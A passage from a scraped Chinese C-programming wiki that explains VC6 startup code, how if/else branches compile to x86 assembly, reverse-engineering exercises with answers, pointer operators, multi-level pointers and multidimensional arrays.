得到main函数所需的三个参数信息之后，当调用main函数时，便可以将_argc、_argv、env这三个全局变量作为参数，以栈传参方式传递到main函数中。 _cinit函数：用于全局数据和浮点寄存器的初始化。全局对象和IO流等的初始化都是通过这个函数实现的。利用函数_initterm进行数据链初始化，这个函数由两个参数组成，类型为“_PVFV*”，这是一个函数指针数组，其中保留了每个初始化函数的地址。初始化函数的类型为_PVFV，其定义原型如下： 1typedef void(_cdecl*_PVFV)(void)； 也就是说，这个初始化函数是无参数也无返回值的。大家知道，C++规定全局对象和静态对象必须在main函数前构造，在main函数返回后析构。所以，这里的_PVFV函数指针数组就是用来代理调用构造函数的，具体的代码清单如下（_cinite函数的代码片段） 1234567//用于初始化寄存器if(_FPinit！=NULL)(*_FPinit)();//初始化浮点寄存器//用于初始化C语法中的数据_initterm(_xi_a，_xi_z);//用于初始化C++语法中的数据_initterm(_xc_a，_xc_z); 在上述代码清单中，_FPinit是一个全局函数指针，类型也是_PVFV，如果编译器扫描代码时发现有浮点计算，则此指针保存了初始化浮点寄存器的代码地址，否则为0值。如果浮点寄存器未被初始化而进行浮点计算，程序会产生异常或错误（详见2.2节），这类错误应属于VC6.0自身设计的Bug，在VC6.0以后的版本中已将其修复。一般而言，第一个_initterm初始化的都是C支持库中所需的数据。参数_xi_a为函数指针数组的起始地址，_xi_z为结束地址。_initterm的实现如下： 1234567891011121314static void__cdecl_initterm( _PVFV*pfbegin, _PVFV*pfend)&#123; //遍历数组的各元素 while(pfbegin＜pfend) &#123; //若函数指针不为空,则执行该函数 if(*pfbegin！=NULL) (**pfbegin)(); ++pfbegin; &#125;&#125; C++所需数据的初始化操作会在代码清单3-2中第二次对_initterm调用时执行，一般都是全局对象或静态对象的初始化函数。关于全局对象的初始化流程的更多内容请见第10章。 VC编译器的版本不同，mainCRTStartup函数也可能会有所不同，如Microsoft Visual Studio 2005又称VC++8.0，其中mainCRTStartup的名字就变为了_tmainCRTStartup。 修改入口函数 在控制台程序，入口函数是main，程序启动时会从mainCRTStartup启动，再传入main所需要的三个参数，然后调用main函数。 如果自己指定入口函数，将直接从KERNEL32中调用重新指定的入口函数，而不会先调用mainCRTStarup。 菜单Project-&gt;Settings-&gt;Link-&gt;Output，在Entry-point symbol中填写重新指定的新入口函数的名称，编译后调试查看call stack，可以看到从自己指定的新入口函数启动。 mainCRTStartup()函数中会用_heap_init初始化堆空间，实际上malloc函数是从现有的堆空间拿一块来使用。如果自定义了入口函数，因为没有调用入口函数前没有调用mainCRTStartup()，堆空间没被初始化，当使用到堆空间时，程序会报错并崩溃。 结论 VC++6.0下的main函数是启动函数中唯一具有3个参数的函数。WinMain是启动函数中唯一的具有4个参数的函数。 在VC++6.0中，main函数被调用前要先调用的函数如下： 12345678910111213GetVersion()_heap_init()GetCommandLineA()_crtGetEnvironmentStringsA()_setargv()_setenvp()_cinit() 这些函数调用结束后就会调用main函数。OD可能会识别出以上某个函数，往后找，根据main函数调用的特征，会将3个参数压入栈内作为函数的参数，它就是main函数。"},{"title":"分支语句","path":"/wiki/C/分支语句.html","content":"if语句（正向） if语句 略 if…else语句 略 多分支语句 多分支是由if和if…else…组成的分支结构。语法格式为：if…else if…else if…，可重复后缀为else if。当最后为else时，便到了多分支结构的末尾处，不再分支。 一堆if语句要当成一个整体看待。 分支语句，从上往下判断（计算机本身就是顺序取指执行），只要有一个条件成立，其他的就不判断了。此外，因为这一点，所以下面代码这种写法，else if应该判断x&lt;=1的其他情况，要不在逻辑上是无效的代码。 1234567891011121314151617181920212223242526272829#include &lt;stdio.h&gt;int x=10;void Function()&#123; if(x&gt;1) &#123; printf(&quot;x&gt;1 &quot;); &#125; else if(x&gt;2) &#123; printf(&quot;x&gt;2 &quot;); &#125; else if(x&gt;3) &#123; printf(&quot;x&gt;3 &quot;); &#125; else &#123; printf(&quot;!! &quot;); &#125;&#125;int main()&#123; Function(); return 0;&#125; 运行后输出 12x&gt;1 反汇编角度 if语句 12345678910111213#include &lt;stdio.h&gt;int main()&#123; int x=10; int y=20; if(x&gt;y) &#123; printf(&quot;x&gt;y &quot;); &#125; return 0;&#125; C语言中写的是x&gt;y，就执行printf语句。但在反汇编中是反过来的，jle，小于等于，就跳走不执行。它是反过来生成的，因为这样可以少一条jmp指令，下面我用正向的汇编代码来说明： 12345678910111213 mov dword ptr [ebp-4],0Ah mov dword ptr [ebp-8],14h mov eax,dword ptr [ebp-4] cmp eax,dword ptr [ebp-8] jg L1+ jmp L2L1: push offset string &quot;x&gt;y &quot; call printf add esp,4L2: xor eax,eax 上面的汇编用的jg，和if语句的&gt;保持一致，但是就要多一条jmp指令。 注意：不用硬背表达式与反汇编之间的转换关系。比如反汇编看到jle，然后还原成C就是&gt;。不需要这样，按逻辑角度理解函数的功能即可。 小结 在反汇编种，短路表达式和if语句两种分支结构的实现过程是一样的 123456789;先是执行会影响标志位的相关指令 ;随后跟着各种条件跳转指令 jxx xxxx &#123; ... //if语句块起始 ... ... //语句块结束部分没有jmp &#125; ... //jxx向下跳转的地址就是if语句块结束的地方 if…else…语句 1234567891011121314151617#include &lt;stdio.h&gt;int main()&#123; int x=10; int y=20; if(x&gt;y) &#123; printf(&quot;x&gt;y &quot;); &#125;\telse\t&#123; printf(&quot;x&lt;=y &quot;);\t&#125; return 0;&#125; jle和jmp之间是if语句块的内容。 特点分析 1、如果不跳转，那么会执行到jmp处，jmp跳转到ELSE_END处 2、如果跳转，则会跳过jmp ELSE_END处的代码，顺序执行后面的代码 行为：跳转执行一部分代码，不跳转执行另外一部分代码 反汇编特征：第一个jxx跳转的地址的上一个指令是jmp ,可以判断是if…else…语句 指令序列总结如下 123456789;先执行影响标志位的相关指令 jxx ELSE_BEGIN ;该地址为else语句块的首地址IF_BEGIN: ...... ;if语句块内的执行代码IF_END: jmp ELSE_END ;跳转到else语句块的结束地址ELSE_BEGIN: ...... ;else语句块内的执行代码ELSE_END: 多分支语句 1234567891011121314151617181920#include &lt;stdio.h&gt;int main()&#123; int x=10; if(x&gt;0) &#123; printf(&quot;x&gt;0 &quot;); &#125;\telse if(x==0)\t&#123; printf(&quot;x=0 &quot;);\t&#125;\telse\t&#123; printf(&quot;x&lt;0 &quot;);\t&#125; return 0;&#125; 从上往下看 1230040D408 mov dword ptr [ebp-4],0Ah0040D40F cmp dword ptr [ebp-4],00040D413 jle main+34h (0040d424) 作比较，然后跳到了0040d424，是个if语句。 随后看到0040d424上方是个jmp，这里可能是上面if配套的else。 120040D422 jmp main+56h (0040d446)0040D424 cmp dword ptr [ebp-4],0 （以上是前面讲的if语句，和，if…else语句结构的知识） 但紧跟着又来了一个跳转，所以上面的是else if结构。 10040D428 jne main+49h (0040d439) 那么else语句块在哪：执行前没有jxx跳转。 特点分析 1、每个条件跳转指令跳转到的地址那,上一条指令都有jmp 2、这些jmp指令跳转的地址都是一样的（多分支结构的结尾） 3、如果某个分支没有条件判断，则为else部分 12345678910111213141516;会影响标志位的指令 jxx ELSE_IF_BEGIN ;跳转到下一条else if语句块的首地址IF_BEGIN: ...... ;if语句块内的执行代码IF_END: jmp END ;跳转到多分支结构的结尾地址ELSE_IF_BEGIN: ;else if语句块的起始地址;可影响标志位的指令 jxx ELSE_BEGIN ;跳转到else分支语句块的首地址 ...... ;else if语句块内的执行代码 ELSE_IF_END: ;else if结尾处 jmp END ;跳转到多分支结构的结尾地址ELSE_BEGIN: ;else语句块的起始地址 ...... ;else语句块内的执行代码END: ;多分支结构的结尾处 ...... 逆向分析例子和练习 if语句 函数调用处代码 1234push 5\tpush 4\tcall 0040100f\tadd esp,8 函数内部代码 12345678910111213141516171819202100401030 push ebp00401031 mov ebp,esp00401033 sub esp,40h00401036 push ebx00401037 push esi00401038 push edi00401039 lea edi,[ebp-40h]0040103C mov ecx,10h00401041 mov eax,0CCCCCCCCh00401046 rep stos dword ptr [edi]00401048 mov eax,dword ptr [ebp+8]0040104B cmp eax,dword ptr [ebp+0Ch]0040104E jle 0040105900401050 mov ecx,dword ptr [ebp+8]00401053 mov dword ptr [004225c4],ecx00401059 pop edi0040105A pop esi0040105B pop ebx0040105C mov esp,ebp0040105E pop ebp0040105F ret 分析过程 函数调用处代码，分析，两个参数 函数内部功能分析 分析参数 123[ebp+8] : X[ebp+0Ch] :Y 分析局部变量 无。没看到[ebp-几] 分析全局变量 1mov dword ptr 004225c4,ecx 功能分析 12mov eax,dword ptr [ebp+8]cmp eax,dword ptr [ebp+0Ch] 将参数X存到到EAX中，然后比较EAX与参数Y的大小 如果X&lt;=Y,那么跳转到00401059的位置;否则，将X的值存储到全局变量中。 返回值分析 无 小结 先分析和确定参数，然后分析功能 练习 按上述分析流程分析下面这段代码，还原成C语言 1234567891011121314151617181920212223242526272829push 5push 4call 0040100fadd esp,800401030 push ebp00401031 mov ebp,esp00401033 sub esp,44h00401036 push ebx00401037 push esi00401038 push edi00401039 lea edi,[ebp-44h]0040103C mov ecx,11h00401041 mov eax,0CCCCCCCCh00401046 rep stos dword ptr [edi]00401048 mov eax,[004225c4]0040104D mov dword ptr [ebp-4],eax00401050 mov ecx,dword ptr [ebp+8]00401053 cmp ecx,dword ptr [ebp+0Ch]00401056 jg 0040106400401058 mov edx,dword ptr [ebp+0Ch]0040105B add edx,dword ptr [ebp-4]0040105E mov dword ptr [004225c4],edx00401064 pop edi00401065 pop esi00401066 pop ebx00401067 mov esp,ebp00401069 pop ebp0040106A ret 答案函数调用处代码，分析，两个参数函数内部功能分析分析参数123[ebp+8] : X[ebp+0Ch] :Y分析局部变量1[ebp-4] : a分析全局变量12300401048 mov eax,[004225c4]0040105E mov dword ptr [004225c4],edx大小为4字节的全局变量功能分析1234567891000401048 mov eax,[004225c4]0040104D mov dword ptr [ebp-4],eax00401050 mov ecx,dword ptr [ebp+8]00401053 cmp ecx,dword ptr [ebp+0Ch]00401056 jg 0040106400401058 mov edx,dword ptr [ebp+0Ch]0040105B add edx,dword ptr [ebp-4]0040105E mov dword ptr [004225c4],edx将全局变量赋值给局部变量a参数X和参数Y比大小，如果X&gt;Y，跳转到00401064的位置，结束调用；否则，将Y+a的值存储到全局变量中。返回值分析无还原成C语言代码12345678910int g;void Func(int x,int Y)&#123; int a=g; if(X&lt;=Y) &#123; g=a+Y; &#125;&#125; if…else…语句 12345678910111213141516171819202122232425262728004010B0 push ebp004010B1 mov ebp,esp004010B3 sub esp,44h004010B6 push ebx004010B7 push esi004010B8 push edi004010B9 lea edi,[ebp-44h]004010BC mov ecx,11h004010C1 mov eax,0CCCCCCCCh004010C6 rep stos dword ptr [edi]004010C8 mov eax,[004225c4]004010CD mov dword ptr [ebp-4],eax004010D0 mov ecx,dword ptr [ebp+8]004010D3 cmp ecx,dword ptr [ebp+0Ch]004010D6 jle 004010e6004010D8 mov edx,dword ptr [ebp+8]004010DB add edx,dword ptr [ebp-4]004010DE mov dword ptr [004225c4],edx004010E4 jmp 004010f1004010E6 mov eax,dword ptr [ebp+0Ch]004010E9 add eax,dword ptr [ebp-4]004010EC mov [004225c4],eax004010F1 pop edi004010F2 pop esi004010F3 pop ebx004010F4 mov esp,ebp004010F6 pop ebp004010F7 ret 函数内部功能分析 分析参数 123[ebp+8] : X[ebp+0Ch] :Y 分析局部变量 1[ebp-4] = eax = [004225c4] 分析全局变量 1[004225c4] G 功能分析 比较X和Y的大小。 如果X&lt;=Y，执行 123004010E6 mov eax,dword ptr [ebp+0Ch]004010E9 add eax,dword ptr [ebp-4]004010EC mov [004225c4],eax 123YY=Y+GG=Y 如果X&gt;Y，那么执行 1234004010D8 mov edx,dword ptr [ebp+8]004010DB add edx,dword ptr [ebp-4]004010DE mov dword ptr [004225c4],edx004010E4 jmp 004010f1 123XX=X+GG=X 返回值分析 无 练习 按上述分析流程分析下面这段代码，还原成C语言 12345678910111213141516171819202122232425262728293031323334004010B0 push ebp004010B1 mov ebp,esp004010B3 sub esp,48h004010B6 push ebx004010B7 push esi004010B8 push edi004010B9 lea edi,[ebp-48h]004010BC mov ecx,12h004010C1 mov eax,0CCCCCCCCh004010C6 rep stos dword ptr [edi]004010C8 mov eax,[004225c4]004010CD mov dword ptr [ebp-4],eax004010D0 mov dword ptr [ebp-8],2004010D7 mov ecx,dword ptr [ebp+8]004010DA cmp ecx,dword ptr [ebp+0Ch]004010DD jl 004010e8004010DF mov edx,dword ptr [ebp-8]004010E2 add edx,1004010E5 mov dword ptr [ebp-8],edx004010E8 mov eax,dword ptr [ebp+8]004010EB cmp eax,dword ptr [ebp+0Ch]004010EE jge 004010fb004010F0 mov ecx,dword ptr [ebp-8]004010F3 mov dword ptr [004225c4],ecx004010F9 jmp 00401107004010FB mov edx,dword ptr [ebp-4]004010FE add edx,dword ptr [ebp-8]00401101 mov dword ptr [004225c4],edx00401107 pop edi00401108 pop esi00401109 pop ebx0040110A mov esp,ebp0040110C pop ebp0040110D ret 答案分析参数123[ebp+8] : x[ebp+0Ch] :y分析局部变量123[ebp-4] : a[ebp-8] : b分析全局变量1[004225c4] g大小为4字节的全局变量功能分析12a=g;b=2;参数x和参数y比大小：如果x&gt;=y，执行123004010DF mov edx,dword ptr [ebp-8]004010E2 add edx,1004010E5 mov dword ptr [ebp-8],edx1b=b+1;如果x&lt;y，跳到004010E8参数x和参数y比大小：如果x&gt;=y，执行123004010FB mov edx,dword ptr [ebp-4]004010FE add edx,dword ptr [ebp-8]00401101 mov dword ptr [004225c4],edx1g=a+b;如果x&lt;y，执行123004010F0 mov ecx,dword ptr [ebp-8]004010F3 mov dword ptr [004225c4],ecx004010F9 jmp 004011071g=b;返回值分析无还原成C语言代码12345678910111213141516171819int g;void func(int x,int y)&#123; int a=g; int b=2; if(x&gt;=y) &#123; b+=1; &#125; if(x&gt;=y) &#123; g=a+b; &#125; else &#123; g=b; &#125;&#125; 多分支语句 分析参数 12345[ebp+8] : X[ebp+0Ch] :Y[ebp+10h] :Z 分析局部变量 123[ebp-4] = A = 0[ebp-8] = B = 1[ebp-0Ch] = C = 2 分析全局变量 无 功能分析 1234567891011121314151617if(x&gt;y)&#123;\tA = B+1;&#125;else if(x&gt;z)&#123;\tA = C+1;&#125;else if(y&gt;z)&#123;\tA = B+C&#125;else&#123;\tA = B+C+1;&#125; return A; 练习 按上述分析流程分析下面这段代码，还原成C语言 12345678910111213141516171819202122232425262728293031323334353637383940414243444546004010B0 push ebp004010B1 mov ebp,esp004010B3 sub esp,4Ch004010B6 push ebx004010B7 push esi004010B8 push edi004010B9 lea edi,[ebp-4Ch]004010BC mov ecx,13h004010C1 mov eax,0CCCCCCCCh004010C6 rep stos dword ptr [edi]004010C8 mov dword ptr [ebp-4],0004010CF mov dword ptr [ebp-8],1004010D6 mov dword ptr [ebp-0Ch],2004010DD mov eax,dword ptr [ebp+8]004010E0 cmp eax,dword ptr [ebp+0Ch]004010E3 jg 004010f0004010E5 mov ecx,dword ptr [ebp-8]004010E8 sub ecx,1004010EB mov dword ptr [ebp-4],ecx004010EE jmp 00401123004010F0 mov edx,dword ptr [ebp+0Ch]004010F3 cmp edx,dword ptr [ebp+10h]004010F6 jl 00401103004010F8 mov eax,dword ptr [ebp-0Ch]004010FB add eax,1004010FE mov dword ptr [ebp-4],eax00401101 jmp 0040112300401103 mov ecx,dword ptr [ebp+8]00401106 cmp ecx,dword ptr [ebp+10h]00401109 jle 004011160040110B mov edx,dword ptr [ebp-8]0040110E add edx,dword ptr [ebp-0Ch]00401111 mov dword ptr [ebp-4],edx00401114 jmp 0040112300401116 mov eax,dword ptr [ebp-0Ch]00401119 mov ecx,dword ptr [ebp-8]0040111C lea edx,[ecx+eax-1]00401120 mov dword ptr [ebp-4],edx00401123 mov eax,dword ptr [ebp-4]00401126 add eax,100401129 pop edi0040112A pop esi0040112B pop ebx0040112C mov esp,ebp0040112E pop ebp0040112F ret 答案分析参数12345[ebp+8] : X[ebp+0Ch] :Y[ebp+10h] :Z分析局部变量123[ebp-4] = A = 0[ebp-8] = B = 1[ebp-0Ch] = C = 2分析全局变量无功能分析1234567891011121314151617181920212223int func(int x,int y,int z)&#123; int a=0; int b=1; int c=2; if(x&lt;=y) &#123; a=b-1; &#125; else if(y&gt;=z) &#123; a=c+1; &#125; else if(x&gt;z) &#123; a=b+c; &#125; else &#123; a=c+b-1; &#125; return a+1;&#125;"},{"title":"取址&运算符和取值*运算符","path":"/wiki/C/取址和取值运算符.html","content":"&amp;运算符 使用 &amp;，取地址符。任何变量都可以使用&amp;来获取地址，但不能用在常量上 常量编译后是死的，不能改了，所以叫常量 12345678910111213141516171819#include &quot;stdafx.h&quot;struct Point &#123; int x; int y;&#125;; char a;short b;int c;Point p; int main()&#123; printf(&quot;%x %x %x %x &quot;, &amp;a, &amp;b, &amp;c, &amp;p); printf(&quot;%p %p %p %p &quot;, &amp;a, &amp;b, &amp;c, &amp;p); return 0;&#125; 在这里直接使用取地址符获取变量、结构体的地址，打印输出时的格式可能跟我们之前看到的8位不一样，前面少了2个0。将%x占位符替换为%p来打印就是了。 全局变量的地址是编译时确定，局部变量的地址是调用函数时才分配在堆栈上的。可以看到获取全局变量的地址，汇编指令用的是offset，而获取局部变量用的是lea指令。 LEA和offset运算符的区别： OFFSET只适用于编译时已知的地址 全局变量局部变量12345678910111213141516171819202122#include &quot;stdafx.h&quot;struct Point &#123; int x; int y;&#125;; char a;short b;int c;Point p; int main()&#123;\ta=1;\tb=1;\tc=1; printf(&quot;%p %p %p %p &quot;, &amp;a, &amp;b, &amp;c, &amp;p); return 0;&#125; 12345678910111213141516171819202122#include &quot;stdafx.h&quot;struct Point &#123; int x; int y;&#125;; int main()&#123;\tchar a;\tshort b;\tint c;\tPoint p;\ta=1;\tb=1;\tc=1; printf(&quot;%p %p %p %p &quot;, &amp;a, &amp;b, &amp;c, &amp;p); return 0;&#125; &amp;变量的类型 编译报错 第12行，编译报错，无法将char*类型转换为int类型。说明原本char类型的变量a，加&amp;变成&amp;a后，类型为char*类型 第13行，编译报错，无法将short**类型转换为int类型。说明原本short*类型的变量b，加&amp;变成&amp;b后，类型为short**类型 第14行，编译报错，无法将int***类型转换为int类型。说明原本int**类型的变量c，加&amp;变成&amp;c后，类型为int***类型 结论：（&amp;变量）的类型，就是变量原来的类型再加上一个*号 指针变量赋值 我们能够看懂（&amp;变量）的类型后，就知道怎么给指针变量赋值了。 不用去想p1、p2、p3、p4里面存的是什么东西 123456789101112131415161718192021#include &lt;stdio.h&gt; int main()&#123; char x; char* p1; char** p2; char*** p3; char**** p4; p1 = &amp;x; // 对x变量&amp;后，&amp;x类型是char* p2 = &amp;p1; // 对p1变量&amp;后，&amp;p1类型是char** p3 = &amp;p2; // 对p2变量&amp;后，&amp;p2类型是char*** p4 = &amp;p3; // 对p3变量&amp;后，&amp;p3类型是char**** int y; y= &amp;x; //&amp;x类型是char*，赋给int类型的y编译会报错 y= (int)&amp;x; //非要赋值加强转 return 0;&#125; *运算符 取值运算符用的也是*星号，在之前的学习中。*可以用来表示乘法运算、定义新的类型。 乘法运算： 123int x = 1;int y = 2;int z = x * y; 定义新的类型：（*与原来的数据类型组合，变成一种的类型） 12char x;char* y; 这里我们学习*取值运算符的用法。当*+一个指针类型的表达式时，表示以这个表达式的结果作为地址，来取这个地址上的值。 下面这段代码能编译通过，但运行会报0xC0000005内存访问错误。因为地址1没挂物理页，这个地址上没内容 12int* a = (int*)1; //指针a指向地址1printf(&quot;%x &quot;, *(a + 1)); //取地址(a+1)上的值 1234567898: int* a = (int*)1;00401028 mov dword ptr [ebp-4],1 ;将1赋值给变量a9: printf(&quot;%x &quot;, *(a + 1));0040102F mov eax,dword ptr [ebp-4] ;将变量a的值放到eax中 00401032 mov ecx,dword ptr [eax+4] ;eax+4后，将eax+4作为地址编号，取该地址上的值给ecx00401035 push ecx ;将ecx压栈00401036 push offset string &quot;%x &quot; (0042201c)0040103B call printf (00401070)00401040 add esp,8 a+1，+1，表示下一个存储单元。a是int类型指针，要+4字节，所以汇编中是+4。 （*+指针类型表达式）的类型 编译报错 第10行，编译报错，无法将int**类型转换为int类型。说明原本int***类型的变量a，加*后，类型为int**类型 第11行，编译报错，无法将int***类型转换为int类型。说明原本int****类型的变量b，加*后，类型为int***类型 第12行，编译报错，无法将int****类型转换为int类型。说明原本int*****类型的变量c，加*后，类型为int****类型 第13行，编译通过，d原本是int*类型，加*后为int类型，能赋给int类型的变量p 结论：（*+指针类型表达式）的类型，是变量当前的类型减去一个*号 取值运算符举例 例1 123456int x = 1; //变量x的地址编号为12ff7c，存放的值是1int* p = &amp;x; //取变量x的地址编号放到变量p中，即存放变量x的地址12ff7cprintf(&quot;%x %x &quot;, p, //输出变量p的值（变量x的地址编号12ff7c） *(p)); //输出以变量p为地址编号，取该地址上的值（即变量x的值） 1234567891011121314151617: int x = 1;00401028 mov dword ptr [ebp-4],1 ;将1赋给局部变量6: int* p = &amp;x;0040102F lea eax,[ebp-4] ;取[ebp-4]的内存编号放到另一个局部变量[ebp-8]中00401032 mov dword ptr [ebp-8],eax7:8: printf(&quot;%x %x &quot;, p, *(p));00401035 mov ecx,dword ptr [ebp-8] ;以[ebp-8]作为地址，取该地址上的值，压栈传参00401038 mov edx,dword ptr [ecx] 0040103A push edx0040103B mov eax,dword ptr [ebp-8] ;取[ebp-8]的值，压栈传参0040103E push eax0040103F push offset string &quot;%x &quot; (0042201c)00401044 call printf (00401070)00401049 add esp,0Ch 例2 12int x = 1; int* p = &amp;x; 1p=(int*)2; //改的是p 1*(p)=2; //改的是p指向的那个地址的值，就是改的x 例3 1234567891011121314151617181920#include &quot;stdafx.h&quot;int x;int* p;int** p2;int*** p3;int main()&#123; x = 1; p = &amp;x; p2 = &amp;p; p3 = &amp;p2; int r = *(*(*(p3))); printf(&quot;%d &quot;, r); return 0;&#125; 变量 变量的地址 变量的值 x 00427e40 1 p 00427e3c 00427e40 p2 00427e38 00427e3c p3 00427e34 00427e38 变量p3存的是变量p2的地址，*p3=变量p2 变量p2存的是变量p的地址，*p2=变量p 变量p存的是变量x的地址，*p=变量x ***p3=变量x 从新视角学习指针 &amp;为取地址符，作用是取地址。只要是变量，就能用&amp;运算符来取地址。&amp;变量的类型是原来的类型加上一个*号。 *为取值符，作用是取该变量指向内存编号中存储的值。只要是指针类型，就能用*运算符来取地址。（意味着变量类型至少有一个*号）。*+指针类型变量的类型是原来的类型减去一个*号。 mov是取值，lea是取地址。 例1 123456789101112131415161718#include &quot;stdafx.h&quot;int main()&#123;\tchar a = 10; short b = 20; int c = 30; char* pa = &amp;a; short* pb = &amp;b; int* pc = &amp;c; char** ppa = &amp;pa; short** ppb = &amp;pb; int** ppc = &amp;pc; return 0;&#125; 完整写法和简写形式1234567891011121314char a = 10; short b = 20; int c = 30; // 完整写法 // &amp;a后的类型明确知道是char*，可以写成后面的简写形式// char* pa = (char*)&amp;a; // short* pb = (short*)&amp;b; // int* pc = (int*)&amp;c; //简写形式char* pa = &amp;a; short* pb = &amp;b; int* pc = &amp;c; 第5行代码：[ebp-4]是变量，存的值是10 第9行代码：取[ebp-4]的地址，放到变量pa（[ebp-10h]）中 第13行代码：取[ebp-10h]的地址，放到变量ppa（[ebp-1Ch]）中 例2 123456789101112131415161718192021222324#include &quot;stdafx.h&quot;int main()&#123; int p = 10; int******* p7; int****** p6; int***** p5; int**** p4; int*** p3; int** p2; int* p1; p1 = &amp;p; p2 = &amp;p1; p3 = &amp;p2; p4 = &amp;p3; p5 = &amp;p4; p6 = &amp;p5; p7 = &amp;p6; return 0;&#125; 局部变量在堆栈中的分配关系如下： 变量 堆栈 p [ebp-4] p1 [ebp-8] p2 [ebp-0Ch] p3 [ebp-10h] p4 [ebp-14h] p5 [ebp-18h] p6 [ebp-1Ch] p7 [ebp-20h] 第15行代码：取[ebp-4]的地址，放到变量p1（[ebp-20h]）中 第16行代码：取[ebp-20h]的地址，放到变量p2（[ebp-1Ch]）中 … 启发 知道用&amp;取址，*取值后的类型是什么，用的时候不会乱。在汇编中就是mov，还是lea一个变量放到另一个变量中。不用频繁想几级几级指针，存的是啥那些，想多了肯定乱。"},{"title":"多级指针","path":"/wiki/C/多级指针.html","content":"123456789int i = 100; int* p1 = &amp;i; //取变量i 的地址，&amp;i 表达式结果的类型是i 变量的类型加上一个*，即int*int** p2 = &amp;p1; //取变量p1的地址，&amp;p1表达式结果的类型是p1变量的类型加上一个*，即int** int*** p3 = &amp;p2; //取变量p2的地址，&amp;p2表达式结果的类型是p2变量的类型加上一个*，即int***int**** p4 = &amp;p3; //取变量p3的地址，&amp;p3表达式结果的类型是p3变量的类型加上一个*，即int****int***** p5 = &amp;p4; //取变量p4的地址，&amp;p4表达式结果的类型是p4变量的类型加上一个*，即int*****int****** p6 = &amp;p5; //取变量p5的地址，&amp;p5表达式结果的类型是p5变量的类型加上一个*，即int******int******* p7 = &amp;p6; //取变量p6的地址，&amp;p6表达式结果的类型是p6变量的类型加上一个*，即int******* 123456789int****** px1 = *(p7); //取变量p7 为地址指向的值，*p7 表达式结果的类型是p7 变量的类型减去一个*，即int******int***** px2 = *(px1); //取变量px1为地址指向的值，*px1表达式结果的类型是px1变量的类型减去一个*，即int*****int**** px3 = *(px2); //取变量px2为地址指向的值，*px2表达式结果的类型是px2变量的类型减去一个*，即int****int*** px4 = *(px3); //取变量px3为地址指向的值，*px3表达式结果的类型是px3变量的类型减去一个*，即int***int** px5 = *(px4); //取变量px4为地址指向的值，*px4表达式结果的类型是px4变量的类型减去一个*，即int**int* px6 = *(px5); //取变量px5为地址指向的值，*px5表达式结果的类型是px5变量的类型减去一个*，即int*int px7 = *(px6); //取变量px6为地址指向的值，*px6表达式结果的类型是px6变量的类型减去一个*，即intint px7 = *(*(*(*(*(*(*(p7))))))); //直接写，指针p7有7个*，最多能取7次 指针取值的两种方式 想取出指针指向的值有两种方式，一是用*取址运算符，二是用数组的形式。 一级指针二级指针三级指针12345678910#include &quot;stdafx.h&quot;int main()&#123; int* p = (int*)1; printf(&quot;%d %d &quot;, p[0], *p); //p[0] = *(p+0) = *p return 0;&#125; 一次取址 120040102F mov eax,dword ptr [ebp-4]00401032 mov ecx,dword ptr [eax] 12345678910#include &quot;stdafx.h&quot;int main()&#123; int** p = (int**)1; printf(&quot;%d %d &quot;, p[0][0], **p); //p[0][0] = *(*(p+0)+0) = **p return 0;&#125; 两次取址 1230040102F mov eax,dword ptr [ebp-4]00401032 mov ecx,dword ptr [eax]00401034 mov edx,dword ptr [ecx] 12345678910#include &quot;stdafx.h&quot;int main()&#123; int*** p = (int***)1; printf(&quot;%d %d %d &quot;, p[0][0][0], ***p); //p[0][0] = *(*(*(p+0)+0)+0) = ***p return 0;&#125; 三次取址 12340040102F mov eax,dword ptr [ebp-4]00401032 mov ecx,dword ptr [eax]00401034 mov edx,dword ptr [ecx]00401036 mov eax,dword ptr [edx] 小结：*() 与 []可以互换 如果有偏移 一级指针二级指针三级指针12345678910#include &quot;stdafx.h&quot;int main()&#123; int* p = (int*)1; printf(&quot;%d %d &quot;, p[1], *(p+1)); //p[1] = *(p+1) return 0;&#125; 分析*(p+1)： 表达式 类型 去掉一个*后的类型 +1是加几 p int* int，宽度为4 – (p+1) int* int，宽度为4 4 *(p+1) 原类型去掉一个*，为int – – 12345678910#include &quot;stdafx.h&quot;int main()&#123; int** p = (int**)1; printf(&quot;%d %d &quot;, p[1][2], *(*(p+1)+2)); //p[1][2] = *(*(p+1)+2) return 0;&#125; 分析*(*(p+1)+2)： 表达式 类型 去掉一个*后的类型 +1是加几 p int** int*，宽度为4 – (p+1) 仍为int** int*，宽度为4 4 *(p+1) 原类型去掉一个*，为int* – – *(p+1)+2 仍为int* int，宽度为4 4 *(*(p+1)+2) 原类型去掉一个*，为int – – 所以会看到+4，和+8 12345678910#include &quot;stdafx.h&quot;int main()&#123; int*** p = (int***)1; printf(&quot;%d %d %d &quot;, p[1][2][3], *(*(*(p+1)+2)+3)); //p[1][2][3] = *(*(*(p+1)+2)+3) return 0;&#125; 分析*(*(*(p+1)+2)+3)： 表达式 类型 去掉一个*后的类型 +1是加几 p int*** int**，宽度为4 – (p+1) 仍为int*** int**，宽度为4 4 *(p+1) 原类型去掉一个*，为int** – – *(p+1)+2 仍为int** int*，宽度为4 4 *(*(p+1)+2) 原类型去掉一个*，为int* – – *(*(p+1)+2)+3 仍为int* int，宽度为4 4 *(*(*(p+1)+2)+3) 原类型去掉一个*，为int – 所以会看到+4，+8，+0Ch 小结 1234*(p+i) = p[i] *(*(p+i)+k) = p[i][k] *(*(*(p+i)+k)+m) = p[i][k][m] *(*(*(*(*(p+i)+k)+m)+w)+t) = p[i][k][m][w][t]"},{"title":"多维数组","path":"/wiki/C/多维数组.html","content":"定义 二维数组 根据我们前面学的一维数组，如果我们想用数组表示这个问题：一个班有5个组，每个组有9个人，我们可以这样定义数组： 123int arr[45];//或int arr[5*9]; //整数常量表达式 也可以用这种形式，也称二维数组 1int arr[5][9]; 多维数组 比如一个县有5个学校，每个学校有3个年级，每个年级有4个班，每个班有5个组，每个组有9个人。 123int arr[5*3*4*5*9];//或int arr[5][3][4][5][9]; 初始化多维数组 123456int arr[3][4]=&#123; &#123;1,2,3,4&#125;, &#123;5,6,7,8&#125;, &#123;9,7,6,5&#125;,&#125;; 初始化的数值如果不够，后面没有值初始化的元素被统一初始化为0 12345int arr[3][4] = &#123; &#123;1,2&#125;,\t&#123;5&#125;,\t&#123;9&#125;&#125; 不允许超过维度的最大长度，以下代码编译会报错 123456789101112#include &quot;stdafx.h&quot;int main(int argc, char *argv[])&#123; int arr[3][4] = &#123; &#123;1, 2, 3, 4, 5&#125;, &#123;5&#125;, &#123;9&#125; &#125;; return 0;&#125; 可以省略里面的&#123;&#125;，&#123;&#125;只是让程序员开起来更直观，对编译器而言都是一维数组。 123int arr[3][4] = &#123;1, 2, 3, 4, 5, 6, 